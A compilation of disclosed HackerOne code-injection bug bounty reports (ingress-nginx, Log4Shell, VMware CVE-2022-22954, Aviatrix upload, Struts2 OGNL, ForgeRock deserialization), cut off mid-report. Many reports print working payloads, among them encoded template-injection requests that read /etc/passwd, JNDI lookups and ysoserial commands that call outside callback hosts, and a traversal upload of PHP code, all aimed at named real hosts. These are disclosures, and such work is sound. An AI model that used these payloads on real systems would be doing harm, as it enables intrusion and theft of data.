- **Report ID:** `1378175`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @amlweems
- **Bounty:** - usd
- **Disclosed:** 2022-08-13T18:13:23.850Z
- **CVE(s):** CVE-2021-25742

**Vulnerability Information:**

I submitted the following report to security@kubernetes.io:
> I've been exploring CVE-2021-25742 and believe I've discovered a variant (although it appears there may be many). Most template variables are not escaped properly in `nginx.tmpl`, leading to injection of arbitrary nginx directives. For example, the `nginx.ingress.kubernetes.io/connection-proxy-header` annotation is not validated/escaped and is inserted directly into the `nginx.conf` file.
>
> An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).
>
> I've created a secret gist demonstrating the issue against ingress-nginx v1.0.4: https://gist.github.com/amlweems/1cb7e96dca8ada8aee8dc019d4163f2c

## Impact

An attacker with permission to create/modify ingresses in one namespace can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account). This service account has permission to read secrets in all namespaces.

---

### [Server Side Template Injection on Name parameter during Sign Up process](https://hackerone.com/reports/1104349)

- **Report ID:** `1104349`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Glovo
- **Reporter:** @battle_angel
- **Bounty:** - usd
- **Disclosed:** 2022-07-11T08:42:35.601Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. 
In this scenario, when an attacker signs up on the platform and uses a payload in the **First Name** field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user

## Steps To Reproduce:
Step 1: Navigate to [Glovoapp] (https://www.glovoapp.com/kg/en/bishkek/) and click on **Register**
Step 2: Now, in the ```First Name``` field, enter the value ```{{7*7}}```

{F1197322}


Step 3: Fill in the rest of the values on the Register page and register your account.

{F1197320}


Step 4: We have used the payload ```{{7*7}}``` here to verify that it is being evaluated at the backend
Step 5: Now, wait for the welcome/promotional email to arrive in your Inbox
Step 6: Notice that the email arrives with the Subject as ```49, welcome to Glovo!```

{F1197321}


Step 7: The attacker can now further exploit this issue by injecting malicious payloads in the Name field and gathering sensitive information from the application.


Note- After carrying out this attack, I didn't receive any welcome email for my other account maybe because the code broke.

## Impact

Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, which can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

---

### [[Urgent] Critical Vulnerability [RCE] on ███ vulnerable to Remote Code Execution by exploiting MS15-034, CVE-2015-1635](https://hackerone.com/reports/469730)

- **Report ID:** `469730`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ashutosh7
- **Bounty:** - usd
- **Disclosed:** 2022-05-26T16:23:28.157Z
- **CVE(s):** CVE-2015-1635

**Summary (team):**

@ashutosh7 found a ███████ server in Shodan, vulnerable to MS15-034, confirmed using Metasploit. Thanks for participating in the DoD VDP.

**Summary (researcher):**

Found a ████ server in shodan, vulnerable to MS15-034. confirmed using Metasploit. will add the link for the writeup.

---

### [██████████ vulnerable to CVE-2022-22954](https://hackerone.com/reports/1537543)

- **Report ID:** `1537543`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @v1ct0rv0nd00m
- **Bounty:** - usd
- **Disclosed:** 2022-04-29T13:58:40.254Z
- **CVE(s):** CVE-2022-22954

**Vulnerability Information:**

I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible 

**Technical Summary:**

CVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template injection flaw.

**Vulnerable URL:**

https://████/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d

## Impact

The impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution by taking full control of the back-end server. Even without the code execution, the attacker may be able to read sensitive data on the server

## System Host(s)
███████

## Affected Product(s) and Version(s)
VMware workspace One

## CVE Numbers
CVE-2022-22954

## Steps to Reproduce
* Visit the vulnerable URL **https://████** and Intercept the request in burp suite
* Append the following endpoint **/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d** and analyze the response you will see the contents of **/etc/passwd**

**Request:**

```
GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d HTTP/1.1
Host: █████████
Cookie: LOGIN_XSRF=NSlYKinVNwgOtuT; JSESSIONID=A86B60C5FD0B58346764D1FB01DAF155
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
```

**Response:**

```
HTTP/1.1 400 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: EUC_XSRF_TOKEN=6386e149-ff55-4a34-b474-30e6c0c62299; Path=/catalog-portal; Secure
Cache-Control: no-cache,private
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Frame-Options: SAMEORIGIN
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Mon, 11 Apr 2022 15:03:40 GMT
Connection: close
Content-Length: 3576

<!DOCTYPE HTML>
<html xmlns="http://www.w3.org/1999/html">
<head>
    <title>Error Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <style>
        body {
            background: #465361;
        }

        .error-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            text-align: center;
            width: 25%;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 3px 2px -2px rgba(0, 0, .5, 0.35);
            border-radius: 4px;
        }

        .error-img-container svg {
            width: 40px;
        }

        .error-text-heading {
            font-weight: bold;
            padding-top: 5px;
            padding-bottom: 10px;
        }

        .error-text-container a {
            text-decoration: none;
        }
    </style>
</head>

<body>
<div class="error-container">
    <div class="error-img-container">
        <svg id="icon-warning-big" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
            <path d="M28.48,24.65,17.64,5.88a1.46,1.46,0,0,0-1.28-.74h0a1.46,1.46,0,0,0-1.28.74L4.25,24.64a1.48,1.48,0,0,0,1.28,2.22H27.2a1.48,1.48,0,0,0,1.28-2.21Zm-1.07.86a.24.24,0,0,1-.21.12H5.53a.24.24,0,0,1-.21-.37L16.15,6.49a.24.24,0,0,1,.21-.12h0a.24.24,0,0,1,.21.12L27.41,25.26A.23.23,0,0,1,27.41,25.51Z"
                  fill="#991700" stroke-width="0"/>
            <circle cx="16.36" cy="13.53" r="0.92" fill="#f38b00" stroke-width="0"/>
            <path d="M16.36,16.43a.62.62,0,0,0-.62.62v5.55a.62.62,0,0,0,1.23,0V17A.62.62,0,0,0,16.36,16.43Z"
                  fill="#991700" stroke-width="0"/>
        </svg>
    </div>
    <div class="error-text-heading">Request Failed</div>
    <div class="error-text-container">
        <p>Please contact your IT Administrator.</p>
        <a href="/catalog-portal/ui/logout?error=&deviceUdid=$%7B%22freemarker.template.utility.Execute%22?new()(%22cat%20/etc/passwd%22)%7D">Sign Out</a>
    </div>
</div>
</body>
<script>
    if (console && console.log) {
        console.log("auth.context.invalid");
        console.log("Authorization context is not valid. Login request  received with tenant code: ███████, device id: root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/dev/null████████
    }
</script>
</html>
```

* As you can see the above response, which contains the response of **/etc/passwd** in the response

## Suggested Mitigation/Remediation Actions
Update the Instance to the latest version

---

### [███ vulnerable to CVE-2022-22954](https://hackerone.com/reports/1537694)

- **Report ID:** `1537694`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @v1ct0rv0nd00m
- **Bounty:** - usd
- **Disclosed:** 2022-04-20T20:16:38.840Z
- **CVE(s):** CVE-2022-22954

**Vulnerability Information:**

I found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible 

**Technical Summary:**

CVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template injection flaw.

**Vulnerable URL:**

███=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d

## Impact

The impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution by taking full control of the back-end server. Even without the code execution, the attacker may be able to read sensitive data on the server

## System Host(s)
██████, ████

## Affected Product(s) and Version(s)
VMware workspace one

## CVE Numbers
CVE-2022-22954

## Steps to Reproduce
* Run the following curl command 

**Command Used:**

curl -sk -X GET -H "Host: ██████" "█████████=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d"

**Response:**

```
<!DOCTYPE HTML>
<html xmlns="http://www.w3.org/1999/html">
    <head>
        <title>Error Page</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <link rel="stylesheet" type="text/css" href="/catalog-portal/css/errorpage.css">
    </head>

    <body>
        <div class="error-container">
            <div class="error-img-container">
                <img src="/catalog-portal/app/graphics/warning.svg" class="warning-icon">
            </div>
            <div class="error-text-heading">Request Failed</div>
            <div class="error-text-container">
                <p>Please contact your IT Administrator.</p>
                <a href="/catalog-portal/ui/logout?error=&deviceUdid=$%7B%22freemarker.template.utility.Execute%22?new()(%22cat%20/etc/passwd%22)%7D">Sign Out</a>
            </div>
        </div>
    </body>
    <script>
        if(console && console.log) {
            console.log("auth.context.invalid");
            console.log("Authorization context is not valid. Login request  received with tenant code: uhhz-lbr-004v, device id: █████;
        }
    </script>
</html>
```

* As you can see the above response, which contains the response of /etc/passwd in the response

## Suggested Mitigation/Remediation Actions
Upgrade the instances to the latest version

---

### [F5 BIG-IP TMUI RCE - CVE-2020-5902 (██.packet8.net)](https://hackerone.com/reports/1519841)

- **Report ID:** `1519841`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** 8x8
- **Reporter:** @remonsec
- **Bounty:** - usd
- **Disclosed:** 2022-03-25T11:11:39.909Z
- **CVE(s):** CVE-2020-5902

**Summary (team):**

@remonsec reported to us a vulnerability in F5 BIG-IP's Traffic Management User Interface (TMUI), which exploited, could have led to RCE (in undisclosed pages): [CVE-2020-5902](https://support.f5.com/csp/article/K52145254)
We swiftly applied the fix to the F5 BIG-IP & restricted access further, which resolved the issue.

---

### [Log4j Java RCE in [beta.dev.adobeconnect.com]](https://hackerone.com/reports/1442644)

- **Report ID:** `1442644`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Adobe
- **Reporter:** @sheikhrishad0
- **Bounty:** - usd
- **Disclosed:** 2022-03-21T16:26:11.645Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Security Team,

###Summary
Log4j versions prior to 2.15.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.
As per Apache's Log4j security guide: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.

###Platform Affected: [website]
https://beta.dev.adobeconnect.com

###Proof of concept:

* Request:

```javascript
GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
Host: beta.dev.adobeconnect.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

* Response:

{F1569913}

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

Regards,
Sheikh rishad

---

### [Remote Code Execution on ██.8x8.com via .NET VSTATE Deserialization](https://hackerone.com/reports/1391576)

- **Report ID:** `1391576`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** 8x8
- **Reporter:** @0daystolive
- **Bounty:** - usd
- **Disclosed:** 2022-02-03T16:37:21.148Z
- **CVE(s):** -

**Summary (team):**

@0daystolive reported to us a flaw in a 3rd party community platform, which could be exploited to achieve RCE. We swiftly relayed this to the vendor and their engineering team turned off the affected code, which resolved the issue.

**Summary (researcher):**

For more details about this vulnerability read: https://blog.sorcery.ie/posts/higherlogic_rce

TLDR:
1. Generate payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net): ```ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com" -o raw | base64 -d | gzip - | base64 -w0```
2. Insert payload into `__VSTATE` parameter on the page.
3. Submit the form.
4. A DNS request is observed on interactsh, confirming the RCE.

---

### [Log4Shell: RCE 0-day exploit on █████████](https://hackerone.com/reports/1429014)

- **Report ID:** `1429014`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @mr_x_strange
- **Bounty:** - usd
- **Disclosed:** 2022-01-03T21:23:25.768Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

Hi team,
log4 shell is recent 0-day exploit it's Java package vulnerable. ██████████ domain is vulnerable

## Impact

RCE

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Go to this url => https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d
2. paste the poc code on  ██████ url parameter
3. like this =>   https://██████████/██████
4. then burp collaborator received reverse ping back
5. I attached poc videos and photos below

##POC CODE
${jndi:ldap://x${hostName}.log4j.xxxxxxx.burpcollaborator.net/a}

## Suggested Mitigation/Remediation Actions
https://www.lunasec.io/docs/blog/log4j-zero-day/

---

### [CVE-2021-40870 in [███]](https://hackerone.com/reports/1360593)

- **Report ID:** `1360593`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Informatica
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2021-11-15T09:10:36.843Z
- **CVE(s):** CVE-2021-40870

**Vulnerability Information:**

An issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.

The IP has a SSL certificate pointing to Informatica LLC. 
``curl -kvI https://█████████``

Output

```
 Server certificate:
*  subject: ██████
```


## Steps To Reproduce

First, run this request:
```
POST /v1/backend1 HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 136
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>

```
The retrieve the content from file ``1yv4QQmkj4h4OdmmyT11tkiGf5M.php``

```
GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
Host: ████
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```
Which is basically the output of the phpinfo function:

Response (truncated): 
```
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">SCRIPT_URL </td><td class="v">/v1/1.php </td></tr>
<tr><td class="e">SCRIPT_URI </td><td class="v">https://█████████/v1/1.php </td></tr>
<tr><td class="e">HTTPS </td><td class="v">on </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_C </td><td class="v">US </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_ST </td><td class="v">California </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_L </td><td class="v">Redwood City </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_O </td><td class="v">Informatica LLC </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_OU </td><td class="v">██████ </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_CN </td><td class="v">██████ </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_C </td><td class="v">US </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_O </td><td class="v">HydrantID (Avalanche Cloud Corporation) </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_CN </td><td class="v">HydrantID SSL ICA G2 </td></tr>
<tr><td class="e">SSL_SERVER_SAN_DNS_0 </td><td class="v">███ </td></tr>
<tr><td class="e">SSL_VERSION_INTERFACE </td><td class="v">mod_ssl/2.4.39 </td></tr>
 ```

## Impact

-   An unauthenticated, 3rd-party attacker or adversary can execute remote code
 
### Supporting Material/References
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870

---

### [RCE on 17 different Docker containers on your network](https://hackerone.com/reports/1332433)

- **Report ID:** `1332433`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Nextcloud
- **Reporter:** @0x0luke
- **Bounty:** - usd
- **Disclosed:** 2021-10-20T15:07:37.818Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I was able to get RCE on 17 different docker containers, ranging from postgres and some prod enviroments

## Steps To Reproduce:
I found that there was a unconfigured portainer.io service running on http://spreed-demo.nextcloud.com:9000

  1. I created an administrator account with the login creds admin:password (please change these credentials!!!)
  2. The site redirected me to the portainer backend, which displayed the docker containers running on the box, see first screen shot
  3. I was able to fully interact with the docker containers running, the site also allows me to execute arbitrary bash commands on the boxes, See second screenshot

Other info that was disclosed to me from the panel:
Internal IP addresses,
Docker disk volumes
Docker images,
The docker stacks

## Supporting Material/References:

{F1439949}
{F1439951}

## Impact

An attacker can directly take over each docker container on this system to deploy his own malware, run DDoS attacks etc from inside Nextclouds services.

---

### [Custom crafted message object in Meteor.Call allows remote code execution and impersonation](https://hackerone.com/reports/534887)

- **Report ID:** `534887`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Rocket.Chat
- **Reporter:** @wreiske
- **Bounty:** - usd
- **Disclosed:** 2021-10-11T17:20:44.542Z
- **CVE(s):** -

**Summary (team):**

The researcher found a vulnerability where an attacker could impersonate other users.

---

### [CVE-2021-40870 on [52.204.160.31]](https://hackerone.com/reports/1356845)

- **Report ID:** `1356845`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Elastic
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2021-10-06T16:06:41.191Z
- **CVE(s):** CVE-2021-40870

**Vulnerability Information:**

An issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.

The IP has a SSL certificate pointing to ElasticSearch. 
``curl -kv https://52.204.160.31``

Output

```
 Server certificate:
*  subject: C=US; ST=California; L=Mountain View; O=Elasticsearch, Inc.; CN=*.elasticit.co
```


## Steps To Reproduce

First, run this request:
```
POST /v1/backend1 HTTP/1.1
Host: 52.204.160.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 136
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>

```
The retrieve the content from file ``1yv4QQmkj4h4OdmmyT11tkiGf5M.php``

```
GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
Host: 52.204.160.31
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```
Which is basically the output of the phpinfo function:

Response (truncated): 
```
tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">SCRIPT_URL </td><td class="v">/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>
<tr><td class="e">SCRIPT_URI </td><td class="v">https://52.204.160.31:8443/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>
<tr><td class="e">HTTPS </td><td class="v">on </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_C </td><td class="v">US </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_ST </td><td class="v">California </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_L </td><td class="v">Mountain View </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_O </td><td class="v">Elasticsearch, Inc. </td></tr>
<tr><td class="e">SSL_SERVER_S_DN_CN </td><td class="v">*.elasticit.co </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_C </td><td class="v">US </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_O </td><td class="v">DigiCert Inc </td></tr>
<tr><td class="e">SSL_SERVER_I_DN_CN </td><td class="v">DigiCert SHA2 Secure Server CA </td></tr>
<tr><td class="e">SSL_SERVER_SAN_DNS_0 </td><td class="v">*.elasticit.co </td></tr>
<tr><td class="e">SSL_SERVER_SAN_DNS_1 </td><td class="v">elasticit.co </td></tr>
<tr><td class="e">SSL_VERSION_INTERFACE </td><td class="v">mod_ssl/2.4.39 </td></tr>
<tr><td class="e">SSL_VERSION_LIBRARY </td><td class="v">OpenSSL/1.1.1b </td></tr>
<tr><td class="e">SSL_PROTOCOL </td><td class="v">TLSv1.2 </td></tr>
<tr><td class="e">SSL_SECURE_RENEG </td><td class="v">true </td></tr>
<tr><td class="e">SSL_COMPRESS_METHOD </td><td class="v">NULL </td></tr>
<tr><td class="e">SSL_CIPHER </td><td class="v">ECDHE-RSA-AES128-GCM-SHA256 </td></tr>
<tr><td class="e">SSL_CIPHER_EXPORT </td><td class="v">false </td></tr>
<tr><td class="e">SSL_CIPHER_USEKEYSIZE </td><td class="v">128 </td></tr>
<tr><td class="e">SSL_CIPHER_ALGKEYSIZE </td><td class="v">128 </td></tr>
<tr><td class="e">SSL_CLIENT_VERIFY </td><td class="v">NONE </td></tr>
<tr><td class="e">SSL_SERVER_M_VERSION </td><td class="v">3 </td></tr>
<tr><td class="e">SSL_SERVER_M_SERIAL </td><td class="v">093CE89EF93EE5F18D1E07099ACC5AF9 </td></tr>
<tr><td class="e">SSL_SERVER_V_START </td><td class="v">Mar 20 00:00:00 2020 GMT </td></tr>
<tr><td class="e">SSL_SERVER_V_END </td><td class="v">Mar 25 12:00:00 2022 GMT </td></tr>
<tr><td class="e">SSL_SERVER_S_DN </td><td class="v">CN=*.elasticit.co,O=Elasticsearch\, Inc.,L=Mountain View,ST=California,C=US </td></tr>
<tr><td class="e">SSL_SERVER_I_DN </td><td class="v">CN=DigiCert SHA2 Secure Server CA,O=DigiCert Inc,C=US </td></tr>
<tr><td class="e">SSL_SERVER_A_KEY </td><td class="v">rsaEncryption </td></tr>
<tr><td class="e">SSL_SERVER_A_SIG </td><td class="v">sha256WithRSAEncryption </td></tr>
<tr><td class="e">SSL_SESSION_ID </td><td class="v">9cf6b4b42df9e371982120b49d57f9112c19df3722fb87d15cc592f73e1fa406 </td></tr>
<tr><td class="e">SSL_SESSION_RESUMED </td><td class="v">Initial </td></tr>
<tr><td class="e">HTTP_HOST </td><td class="v">52.204.160.31 </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36 </td></tr>
<tr><td class="e">HTTP_CONNECTION </td><td class="v">close </td></tr>
 ```

## Impact

-   An unauthenticated, 3rd-party attacker or adversary can execute remote code
 
### Supporting Material/References
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870

---

### [RCE Apache Struts2 remote command execution (S2-045) on [wifi-partner.mtn.com.gh]](https://hackerone.com/reports/1070532)

- **Report ID:** `1070532`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** MTN Group
- **Reporter:** @pisarenko
- **Bounty:** - usd
- **Disclosed:** 2021-09-09T11:34:14.647Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A Remote Code Execution vulnerability exists in Apache Struts2 when performing file upload based on Jakarta Multipart parser. It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn't valid an exception is thrown which is then used to display an error message to a user.

## Steps To Reproduce:


 POC

`GET /pwsc/login.do HTTP/1.1
Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())}
Cookie: ROUTEID=.1;JSESSIONID=13E16D2D032451B88B408F0CED57407E.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: wifi-partner.mtn.com.gh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: Keep-alive`


{F1142782} 

you can see how I performed the mathematical formula and printed it in the answer

## Impact

rce

**Summary (researcher):**

If you were waiting here for a skull and a word: "die". 

It just makes me sad that you would think that it's not true.

---

### [ Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)](https://hackerone.com/reports/1248040)

- **Report ID:** `1248040`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T19:50:15.699Z
- **CVE(s):** CVE-2021-35464

**Vulnerability Information:**

RCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.





### Supporting Material/References
- https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464

## Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code

## System Host(s)
████

## Affected Product(s) and Version(s)
ForgeRock OpenAM

## CVE Numbers
CVE-2021-35464

## Steps to Reproduce
First we need to build the payload:
1. Download this jar file 
``wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar``

then 
``java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`` 

You need to change the burp Collaborator id to test it properly. 

The payload is now saved in the payload.txt file. 

Now we need to use the following request:

```
